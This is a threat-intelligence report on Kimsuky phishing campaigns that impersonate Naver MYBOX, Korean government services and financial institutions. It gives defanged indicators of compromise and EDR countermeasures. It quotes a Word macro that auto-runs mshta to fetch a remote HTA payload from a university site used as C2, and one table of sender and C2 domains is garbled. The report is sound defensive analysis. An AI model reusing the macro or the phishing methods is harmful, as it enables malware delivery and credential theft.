1. Overview
○ As many are aware, email phishing remains a persistent global threat and is one of the most commonly used attack vectors by threat actors. URL phishing techniques embedded in emails, without malicious attachments, are often difficult to detect.

○ Traditional phishing attacks that induce users to click URLs may be underestimated as outdated threats. However, a significant portion of domestic phishing attacks includes the Kimsuky group, which should not be overlooked.

○ Security personnel in enterprises and institutions can register scenario-based phishing IoCs (Indicators of Compromise) in Endpoint Detection and Response (EDR) systems to control initial threat infiltration.

○ This report examines actual cases attributed to the Kimsuky group, highlights their key traits, and aims to provide insights and countermeasures to avoid similar phishing threats.

2. Background
○ In October 2023, multiple phishing attacks were discovered in South Korea. Among them were cases disguised as electronic documents from the Korean "Gukmin Secretary" (Government Notification Service).

○ The sender’s address used the domain of a well-known Japanese internet service provider, [Biglobe / 'biglobe.ne[.]jp'].

○ The phishing link embedded in the [Go to electronic document home] button used a Korean-language domain—'gukminbiseo.main[.]hanguk'—provided by the Korean domain registration service 'naedomane[.]hanguk'.

○ Similar cases exist where the phishing was disguised not only as “Gukmin Secretary,” but also as portal email security administrators or other public institution notifications.

○ These cases commonly used Japanese 'Biglobe' domains for sending emails and phishing links using 'naedomane[.]hanguk' domains. Available domain types include:

Hangul domains
.main[.]hanguk
.community[.]hanguk
.server[.]hanguk
.online[.]hanguk
.homepage[.]hanguk
.blog[.]hanguk
.web[.]hanguk

General domains
.p-e[.]kr
.o-r[.]kr
.n-e[.]kr
.r-e[.]kr
.kro[.]kr

○ Threat actors do not exclusively use Japanese email services; Korean email platforms are also frequently exploited. However, phishing sites consistently leverage the ‘naedomane[.]hanguk’ service.
○ These URL-based phishing attacks continue, with threat actors disguising their messages as portal notices or electronic document notifications.

3. Threat Flow Analysis
○ Phishing attacks impersonating the Naver MYBOX service were carried out in various formats. The timeline below outlines the progression:
April 2024: Senders used Japanese Biglobe and U.S. domain 'nsec[.]com'.
May to early September: Senders switched to Korea’s 'cafe24[.]com' service.
Mid-September: New sender domain 'mmbox[.]ru' (Russia) emerged.
October: Another Russian domain 'ncloud[.]ru' was identified.

○ Both Russian domains were spoofed, falsely registered and used via the phishing mailer tool "star 3.0".

○ Initially, C2 servers used UK-based IP addresses. By June, the LRL short URL service was used to mask 'covd.2kool4u[.]net'. From the point of switching to Russian sender domains, phishing links shifted to use 'naedomane[.]hanguk' domains.

○ The following phishing URLs were used to steal email credentials:
Fake MYBOX Security Alert C2 URLs
ned.kesug[.]com (185.27.134[.]201 / 185.27.134[.]144 [GB])
online.hanguk.article-com[.]eu (185.105.33[.]106 [GB])
wud.wuaze[.]com (185.27.134[.]140 [GB])
covd.2kool4u[.]net (185.27.134[.]93 [GB])
owna.loveslife[.]biz (185.27.134[.]120 [GB])
nidiogln.n-e[.]kr
naverbox.p-e[.]kr

4. Phishing Mail Sender
○ The phishing attack emails with fake Russian sender addresses described earlier employed a strategy of inducing anxiety by pretending that malicious activity was detected in the MYBOX cloud service through their subject and body text. An analysis of the internal code of the email shows that the 'evangelia[.]edu' site was used for sending.

○ For reference, Evangelia University ('evangelia[.]edu') is a private university in the United States known for focusing on theology and Christian education, and it is introduced as having a Korean missionary as its president.

○ The Evangelia University website actually contained a mailer capable of sending phishing emails, titled 'star 3.0'.

○ The 'mmbox[.]ru' and 'ncloud[.]ru' domains were used after spoofing the sender address via this mailer. In fact, the emails were sent from Korea, not the US or Russia, employing the 'star 3.0' mailer to create a fake Russian origin. However, in later document spoofing types, legitimate Russian email services such as 'mail[.]ru' were used more frequently.

○ The phishing mail sending program discovered on the university website has been publicly known previously.

○ On November 18, 2021, the American cybersecurity company 'Proofpoint' introduced this in their report [Triple Threat: North Korea-Aligned TA406 Scams, Spies, and Steals].

○ 'Proofpoint' explains how the North Korea-attributed threat actor (TA406), classified as being behind the attacks, is linked to the Kimsuky group and also covers TA406, TA408, and TA427.

○ On page 17 of the report, the 'star 3.0' interface found on Evangelia University's website is shown as-is.

○ Meanwhile, during Kimsuky campaign activities, there was a case where the 'evangelia[.]edu' website was used as a Command and Control (C2) server.

○ On July 23, 2019, a Microsoft Word DOC file was uploaded to Google's VirusTotal service. The document contained a specific macro command and exhibited typical malware characteristics associated with the Kimsuky group.
Attribute VB_Name = "NewMacros"

Sub autoopen()
Shell ("mshta.exe https://evangelia[.]edu/image/bin/Rjboi0.hta")
End Sub
[Table 1] Macro command (partially modified)

○ In the VirusTotal view, the file name was '1.doc', and the detection names of some anti-malware services included the keyword 'Kimsuky'. There are also multiple variants of the file.

○ Both the document creator and modifier fields of the malicious file contained the username 'windowsmb'. This same username has been detailed in ESTsecurity’s report, "Smoke Screen APT Campaign Targeting Korea and the US Reveals Kimsuky Reality (Outsourcing Attack)".

5. Phishing Emails from Russia
○ As explained earlier in the MYBOX case, phishing emails were mainly sent using email services in Japan and Korea until early September. However, from mid-September, some phishing emails pretending to originate from Russia began to appear.

○ In October, there were numerous cases of spoofed electronic document messages that appeared to come from financial institutions. At this point, actual Russian email services were used to send them.

○ These email themes reused real designs, making them difficult for recipients to suspect. However, a closer look at the 'From' email address reveals suspicious signs—most notably, the inclusion of a Russian (RU) domain.

○ Besides spoofing financial institutions, there were also cases of phishing emails disguised as being from portal blog customer centers. Threat actors use various content to deceive recipients.

○ It is not common to see phishing cases targeting domestic users with Russian email senders. In fact, the use of Russian domains may increase the recipient’s suspicion and lower the chances of phishing success. However, attackers may use this strategy to diversify tactics and avoid detection.

Sender Domain	Command and Control (C2) Address (Partial)	Spoofing Tactic

inbox[. ]ru due - notice notice - notice. Online [. Korean Financial Institution.
list[. Ru financial payment - Guidance - Document - check. Web [. Korean Financial Institution.
internet[. ]ru national tax - due - notice - guide - check. Online [. Korean Financial Institution.
mail[. ] Ru Tax Bureau - Due date - Variation notices. R - E [. ]kr	Korean financial institution
internet[. Kro [.] KR Korean Blog Customer Center

○ For reference, the Russian 'mail[.]ru' service allows users to select from five different domains during registration. The threat actor exploited this feature to change and use different sender addresses.

6. Conclusion and Response
○ A series of phishing campaigns by the Kimsuky group, which do not deliver malicious files, have been occurring. Some argue that the absence of malicious files lowers the level of threat. However, such phishing campaigns can be used as alternative intrusion vectors and for monitoring victims' private lives.

○ Compromised victim accounts may be exploited to launch follow-up attacks on acquaintances or associates. Especially concerning is that the emails are disguised as official documents from financial institutions, which recipients may open without suspicion—hence, extra caution is required. To prevent such phishing attacks and mitigate damage, it is critical to closely inspect whether the sender's email address is an official one.

○ Of course, it is technically possible to spoof an email address to make it appear legitimate, so rather than trusting blindly, verifying the facts to the greatest extent possible is crucial.

○ Genian EDR administrators can use publicly disclosed Indicators of Compromise (IoCs) to check for access records to malicious addresses and, if necessary, add additional detection policies.

○ If an endpoint user accesses an IP address associated with a malicious site registered by the EDR administrator, a message can be delivered according to the response policy conditions.

○ Through basic information inquiry, administrators can view detailed information about detection records and establish threat response policies for the affected endpoint.
